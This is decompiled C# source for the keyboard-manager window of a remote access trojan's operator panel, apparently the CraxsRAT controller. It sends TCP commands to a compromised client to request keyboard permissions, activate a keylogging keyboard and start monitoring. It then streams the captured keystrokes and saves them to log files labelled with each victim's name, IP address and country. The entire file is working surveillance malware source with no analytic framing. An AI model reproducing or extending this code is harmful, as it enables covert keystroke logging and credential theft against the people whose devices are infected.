using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x020000BA RID: 186
	[DesignerGenerated]
	public partial class KeyboardManager : Form
	{
		// Token: 0x06000DBC RID: 3516 RVA: 0x000911D0 File Offset: 0x0008F3D0
		public KeyboardManager()
		{
			base.FormClosing += this.KeyboardManager_FormClosing;
			this.InitializeComponent();
			this.method_0();
		}

		// Token: 0x1700040D RID: 1037
		// (get) Token: 0x06000DBF RID: 3519 RVA: 0x0000699C File Offset: 0x00004B9C
		// (set) Token: 0x06000DC0 RID: 3520 RVA: 0x00091D70 File Offset: 0x0008FF70
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x1700040E RID: 1038
		// (get) Token: 0x06000DC1 RID: 3521 RVA: 0x000069A4 File Offset: 0x00004BA4
		// (set) Token: 0x06000DC2 RID: 3522 RVA: 0x00091D84 File Offset: 0x0008FF84
		internal virtual DrakeUIButtonIcon checkbutton
		{
			[CompilerGenerated]
			get
			{
				return this._checkbutton;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.checkbutton_Click);
				DrakeUIButtonIcon checkbutton = this._checkbutton;
				if (checkbutton != null)
				{
					checkbutton.Click -= value2;
				}
				this._checkbutton = value;
				checkbutton = this._checkbutton;
				if (checkbutton != null)
				{
					checkbutton.Click += value2;
				}
			}
		}

		// Token: 0x1700040F RID: 1039
		// (get) Token: 0x06000DC3 RID: 3523 RVA: 0x000069AC File Offset: 0x00004BAC
		// (set) Token: 0x06000DC4 RID: 3524 RVA: 0x00091DC8 File Offset: 0x0008FFC8
		internal virtual Label Label4 { get; set; }

		// Token: 0x17000410 RID: 1040
		// (get) Token: 0x06000DC5 RID: 3525 RVA: 0x000069B4 File Offset: 0x00004BB4
		// (set) Token: 0x06000DC6 RID: 3526 RVA: 0x00091DDC File Offset: 0x0008FFDC
		internal virtual Label Label3 { get; set; }

		// Token: 0x17000411 RID: 1041
		// (get) Token: 0x06000DC7 RID: 3527 RVA: 0x000069BC File Offset: 0x00004BBC
		// (set) Token: 0x06000DC8 RID: 3528 RVA: 0x00091DF0 File Offset: 0x0008FFF0
		internal virtual Label acttext { get; set; }

		// Token: 0x17000412 RID: 1042
		// (get) Token: 0x06000DC9 RID: 3529 RVA: 0x000069C4 File Offset: 0x00004BC4
		// (set) Token: 0x06000DCA RID: 3530 RVA: 0x00091E04 File Offset: 0x00090004
		internal virtual Label primtext { get; set; }

		// Token: 0x17000413 RID: 1043
		// (get) Token: 0x06000DCB RID: 3531 RVA: 0x000069CC File Offset: 0x00004BCC
		// (set) Token: 0x06000DCC RID: 3532 RVA: 0x00091E18 File Offset: 0x00090018
		internal virtual TextBox statustext { get; set; }

		// Token: 0x17000414 RID: 1044
		// (get) Token: 0x06000DCD RID: 3533 RVA: 0x000069D4 File Offset: 0x00004BD4
		// (set) Token: 0x06000DCE RID: 3534 RVA: 0x00091E2C File Offset: 0x0009002C
		internal virtual Label Label5 { get; set; }

		// Token: 0x17000415 RID: 1045
		// (get) Token: 0x06000DCF RID: 3535 RVA: 0x000069DC File Offset: 0x00004BDC
		// (set) Token: 0x06000DD0 RID: 3536 RVA: 0x00091E40 File Offset: 0x00090040
		internal virtual Label montext { get; set; }

		// Token: 0x17000416 RID: 1046
		// (get) Token: 0x06000DD1 RID: 3537 RVA: 0x000069E4 File Offset: 0x00004BE4
		// (set) Token: 0x06000DD2 RID: 3538 RVA: 0x00091E54 File Offset: 0x00090054
		internal virtual DrakeUIButtonIcon savebutton
		{
			[CompilerGenerated]
			get
			{
				return this._savebutton;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.savebutton_Click);
				DrakeUIButtonIcon savebutton = this._savebutton;
				if (savebutton != null)
				{
					savebutton.Click -= value2;
				}
				this._savebutton = value;
				savebutton = this._savebutton;
				if (savebutton != null)
				{
					savebutton.Click += value2;
				}
			}
		}

		// Token: 0x17000417 RID: 1047
		// (get) Token: 0x06000DD3 RID: 3539 RVA: 0x000069EC File Offset: 0x00004BEC
		// (set) Token: 0x06000DD4 RID: 3540 RVA: 0x00091E98 File Offset: 0x00090098
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x17000418 RID: 1048
		// (get) Token: 0x06000DD5 RID: 3541 RVA: 0x000069F4 File Offset: 0x00004BF4
		// (set) Token: 0x06000DD6 RID: 3542 RVA: 0x00091EAC File Offset: 0x000900AC
		internal virtual DrakeUICheckBox checkenable
		{
			[CompilerGenerated]
			get
			{
				return this._checkenable;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.checkenable_MouseClick);
				DrakeUICheckBox checkenable = this._checkenable;
				if (checkenable != null)
				{
					checkenable.MouseClick -= value2;
				}
				this._checkenable = value;
				checkenable = this._checkenable;
				if (checkenable != null)
				{
					checkenable.MouseClick += value2;
				}
			}
		}

		// Token: 0x17000419 RID: 1049
		// (get) Token: 0x06000DD7 RID: 3543 RVA: 0x000069FC File Offset: 0x00004BFC
		// (set) Token: 0x06000DD8 RID: 3544 RVA: 0x00091EF0 File Offset: 0x000900F0
		internal virtual DrakeUICheckBox checkselected
		{
			[CompilerGenerated]
			get
			{
				return this._checkselected;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.checkselected_MouseClick);
				DrakeUICheckBox checkselected = this._checkselected;
				if (checkselected != null)
				{
					checkselected.MouseClick -= value2;
				}
				this._checkselected = value;
				checkselected = this._checkselected;
				if (checkselected != null)
				{
					checkselected.MouseClick += value2;
				}
			}
		}

		// Token: 0x1700041A RID: 1050
		// (get) Token: 0x06000DD9 RID: 3545 RVA: 0x00006A04 File Offset: 0x00004C04
		// (set) Token: 0x06000DDA RID: 3546 RVA: 0x00091F34 File Offset: 0x00090134
		internal virtual DrakeUICheckBox checkkeypermission
		{
			[CompilerGenerated]
			get
			{
				return this._checkkeypermission;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.checkkeypermission_MouseClick);
				DrakeUICheckBox checkkeypermission = this._checkkeypermission;
				if (checkkeypermission != null)
				{
					checkkeypermission.MouseClick -= value2;
				}
				this._checkkeypermission = value;
				checkkeypermission = this._checkkeypermission;
				if (checkkeypermission != null)
				{
					checkkeypermission.MouseClick += value2;
				}
			}
		}

		// Token: 0x06000DDB RID: 3547 RVA: 0x00091F78 File Offset: 0x00090178
		public void method_0()
		{
			string left = Module4.smethod_1();
			if (Operators.CompareString(left, "AR", false) != 0)
			{
				if (Operators.CompareString(left, "CN", false) == 0)
				{
					this.checkbutton.Text = "检查权限";
					this.savebutton.Text = "保存日志";
					this.primtext.Text = "键盘权限";
					this.acttext.Text = "激活键盘";
					this.montext.Text = "开始监控";
				}
			}
			else
			{
				this.checkbutton.Text = "فحص الصلاحيات";
				this.savebutton.Text = "حفظ السجل";
				this.primtext.Text = "صلاحية لوحة المفاتيح";
				this.acttext.Text = "تفعيل لوحة المفاتيح";
				this.montext.Text = "تفعيل المراقبة";
			}
		}

		// Token: 0x06000DDC RID: 3548 RVA: 0x0009204C File Offset: 0x0009024C
		public void method_1(object[] objects_0)
		{
			if (!this.statustext.InvokeRequired)
			{
				string str = Conversions.ToString(objects_0[0]);
				this.statustext.AppendText("--->" + str + "\r\n");
				this.statustext.SelectionStart = this.statustext.Text.Length;
				this.statustext.ScrollToCaret();
			}
			else
			{
				KeyboardManager.GDelegate17 method = new KeyboardManager.GDelegate17(this.method_1);
				this.statustext.Invoke(method, new object[]
				{
					objects_0
				});
			}
		}

		// Token: 0x06000DDD RID: 3549 RVA: 0x000920D8 File Offset: 0x000902D8
		public void method_2(object[] objects_0)
		{
			if (base.InvokeRequired)
			{
				KeyboardManager.GDelegate18 method = new KeyboardManager.GDelegate18(this.method_2);
				base.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				string[] array = (string[])objects_0[0];
				this.statustext.Text = "";
				if (Operators.CompareString(array[0], "1", false) == 0)
				{
					this.checkkeypermission.Checked = true;
					this.checkkeypermission.Enabled = false;
					this.statustext.AppendText("--->Permission Granted\r\n");
				}
				else
				{
					this.checkkeypermission.Checked = false;
					this.checkkeypermission.Enabled = true;
				}
				if (Operators.CompareString(array[1], "1", false) != 0)
				{
					this.checkselected.Checked = false;
					this.checkselected.Enabled = true;
				}
				else
				{
					this.checkselected.Checked = true;
					this.checkselected.Enabled = false;
					this.statustext.AppendText("--->Keyboard Active now\r\n");
				}
			}
		}

		// Token: 0x06000DDE RID: 3550 RVA: 0x000921D4 File Offset: 0x000903D4
		private void checkenable_MouseClick(object sender, MouseEventArgs e)
		{
			if (!(this.checkkeypermission.Enabled | this.checkselected.Enabled))
			{
				if (!this.checkenable.Checked)
				{
					if (this.gclass8_0 != null)
					{
						TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
						string[] array = this.gclass8_0.string_0.Split(new char[]
						{
							':'
						});
						object[] objects_ = new object[]
						{
							tcpClient_,
							string.Concat(new string[]
							{
								Module13.string_29,
								GClass9.string_0,
								"KBO<*>ENB:2",
								GClass9.string_0,
								array[0],
								GClass9.string_0,
								array[1],
								GClass9.string_0,
								Module13.string_5,
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								GClass9.string_3,
								GClass9.string_0,
								this.gclass8_0.string_2
							}),
							Module2.smethod_9().GetBytes("null"),
							this.gclass8_0
						};
						this.gclass8_0.method_2(objects_);
					}
				}
				else if (this.gclass8_0 != null)
				{
					TcpClient tcpClient_2 = this.gclass8_0.tcpClient_0;
					string[] array2 = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_2 = new object[]
					{
						tcpClient_2,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"KBO<*>ENB:1",
							GClass9.string_0,
							array2[0],
							GClass9.string_0,
							array2[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_2);
				}
			}
			else
			{
				Alert.ShowInformation("Please Enable 1 & 2 first");
				this.checkenable.Checked = false;
			}
		}

		// Token: 0x06000DDF RID: 3551 RVA: 0x00092448 File Offset: 0x00090648
		private void checkbutton_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"KBO<*>lod",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000DE0 RID: 3552 RVA: 0x00092560 File Offset: 0x00090760
		private void checkkeypermission_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.checkkeypermission.Enabled && this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"KBO<*>AKP",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000DE1 RID: 3553 RVA: 0x0009268C File Offset: 0x0009088C
		private void checkselected_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.checkselected.Enabled && this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"KBO<*>AKA",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000DE2 RID: 3554 RVA: 0x000927B8 File Offset: 0x000909B8
		private void savebutton_Click(object sender, EventArgs e)
		{
			if (!string.IsNullOrEmpty(this.statustext.Text))
			{
				try
				{
					if (!Directory.Exists(this.gclass8_0.string_10 + "\\KeyBoard"))
					{
						Directory.CreateDirectory(this.gclass8_0.string_10 + "\\KeyBoard");
					}
					string text = DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".txt";
					if (!File.Exists(this.gclass8_0.string_10 + "\\KeyBoard\\" + text))
					{
						File.Create(this.gclass8_0.string_10 + "\\KeyBoard\\" + text).Dispose();
						File.AppendAllText(this.gclass8_0.string_10 + "\\KeyBoard\\" + text, string.Concat(new string[]
						{
							"Client Name: ",
							this.gclass8_0.string_8,
							"\r\nClient IP: ",
							this.gclass8_0.string_1,
							"\r\nCountry: ",
							this.gclass8_0.string_6,
							"\r\nDate :",
							DateTime.Now.ToString(),
							"\r\n----------------------------------------\r\n"
						}));
					}
					File.AppendAllText(this.gclass8_0.string_10 + "\\KeyBoard\\" + text, text + this.statustext.Text + "\r\n");
					Process.Start(this.gclass8_0.string_10 + "\\KeyBoard");
					return;
				}
				catch (Exception ex)
				{
					return;
				}
			}
			Alert.ShowInformation("No log found to save");
		}

		// Token: 0x06000DE3 RID: 3555 RVA: 0x00092980 File Offset: 0x00090B80
		private void KeyboardManager_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this.checkenable.Checked)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"KBO<*>ENB:2",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x040007B4 RID: 1972
		public GClass8 gclass8_0;

		// Token: 0x020000BB RID: 187
		// (Invoke) Token: 0x06000DE7 RID: 3559
		public delegate void GDelegate17(object[] objects_0);

		// Token: 0x020000BC RID: 188
		// (Invoke) Token: 0x06000DEB RID: 3563
		public delegate void GDelegate18(object[] objects_0);
	}
}
